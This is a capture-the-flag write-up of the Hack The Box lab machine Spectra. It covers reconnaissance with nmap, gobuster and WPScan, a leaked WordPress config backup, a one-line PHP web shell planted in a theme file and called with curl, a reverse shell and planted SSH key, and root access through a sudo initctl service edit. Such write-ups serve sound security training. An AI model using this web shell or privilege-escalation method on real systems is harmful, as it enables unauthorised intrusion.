---
title: "HTB - Spectra without MetaSploit"
date: 2021-07-27
categories: ["hacking", "write-ups"]
tags: [HTB]
featuredImage: "/images/2021/07/Spectra_Logo.png"
---
## Intro
This is an easy Linux box, where I had to get user through a forgotten "backup" on a dev instance, then the privesc came from an unsecured sudo command... Sounds straightforward ? Well, not that much!

## Target
[HTB - Spectra](https://app.hackthebox.eu/machines/317)

## Recon
A quick look to the box info reveals that it is a Linux's box, and that's it!

## Enum
We run our classic `nmap` scan :

```text
sudo nmap -sC -sV -oA scans\spectra
```
```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 15:23 CEST
Nmap scan report for $target_ip
Host is up (0.028s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.50 seconds
```
Only 3 ports are open : http, mysql, and SSH.

### Web enum

Since I found a website, I'll manually browse to it in order to have a quick look. In the mean time, I'll fire up a `gobuster` scan against the IP : 

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spectra.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/27 15:27:27 Starting gobuster in directory enumeration mode
===============================================================
/main                 (Status: 301) [Size: 169] [--> http://spectra.htb/main/]
/testing              (Status: 301) [Size: 169] [--> http://spectra.htb/testing/]
                                                                                 
===============================================================
2021/05/27 15:31:27 Finished
===============================================================
```

Main page shows 2 links pointing to [spectra.htb](http://spectra.htb), this means I need to modify our `/etc/hosts` file accordingly. One instance (main) is a working Wordpress, and the other one (testing) is a broken Wordpress.

Once this is done, I would generally run a few more `gobuster` scans in the background against those two instances and a `WPScan` on the working Wordpress :

```text
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://spectra.htb/main/ [target.ip]
[+] Started: Thu May 27 15:29:13 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.17.4
 |  - X-Powered-By: PHP/5.6.40
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://spectra.htb/main/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://spectra.htb/main/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://spectra.htb/main/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://spectra.htb/main/?feed=rss2, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://spectra.htb/main/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu May 27 15:29:22 2021
[+] Requests Done: 170
[+] Cached Requests: 5
[+] Data Sent: 43.305 KB
[+] Data Received: 357.271 KB
[+] Memory used: 203.707 MB
[+] Elapsed time: 00:00:09
```

This scan didn't reveal anything useful, I also tried to brute force `administrator` user with a top 1000 passwords list from [SecLists](https://github.com/danielmiessler/SecLists). No luck.

I decided to run the `WPScan` first, while browsing manually the other (testing) instance. Pretty quickly, I figured out that `directory listing` was enabled on this instance, this means that browsing to `http://spectra.htb/testing/` instead of `http://spectra.htb/testing/index.php` gave me the full listing of files on the web root.

From here, I could spot a `wp-config.php.save` file that contained credentials to connect to the database. 

I tried connecting remotely, but MySQL wouldn't allow me to connect from my IP.

Finally, I tried logging on the working Wordpress' instance as `administrator` and with the password I found, and it worked! I was in!

## Exploitation

### Getting Initial Shell
Once you are logged with admin priv on a Wordpress, getting a shell is, as far as I have seen, very easy! Basically, it is about editing a theme (preferably an unused one), and adding a small line of `PHP` in order to get some kind of `RCE`.

In this case, I edited theme `twentyseven`, file `404.php` and added the following line : `echo system($_REQUEST['nes']);`

This means, that I can now run commands like so (directly in browser, or via Curl, Burp, etc) :

`curl http://spectra.htb/main/themes/twentyseven/404.php&nes=whoami`

From here, I like to use Burp, convert the request to `POST` and play around or simply get a better shell. 

On this particular box, I had several issues trying to get a proper shell. 

I decided to upload a full php reverse shell via curl... I then reached that URL to get my reverse shell, and... I couldn't [upgrade it](https://www.masoopy.com/cheatsheets/uprgrading-shells/)! However, I noticed that `nginx` user had a real shell inside `/etc/passwd`, so I uploaded my `ssh key` and connected as `nginx` over `SSH`!

From here, I ran `LinPeas` and spotted (not easily) and interesting file : `/etc/autologin/passwd`

#### Getting user
The password found allowed me to log in as `katie` via ssh, and allowed me to grab the `user flag` :

![Spectra - User Flag](/images/2021/07/Spectra_User_Flag.png)

### PrivEsc
Now that I have user, let's see if I can run sudo, and indeed I can run `sudo /sbin/initctl` without password. I headed over [GTFObins](https://gtfobins.github.io/), but unfortunately there was nothing there.

After a little exploration, I noticed that I could `edit` / `start` / `stop` services in `/etc/init/`, and found a particularly interesting one called test.conf.

![Spectra - Test Service](/images/2021/07/Spectra_Test_Service.png)

After more trial and errors, I simply decided to replace the `date` command by `cat /root/root.txt`, which got me the `root flag` from log file in `/var/log/nodetest.log` :

![Spectra - Root Flag](/images/2021/07/Spectra_Root_Flag.png)

## Outro
This was another fun with quite a few unexpected hurdles. It was really cool to "think out of the box" and try to find (ugly) ways to overcome those issues.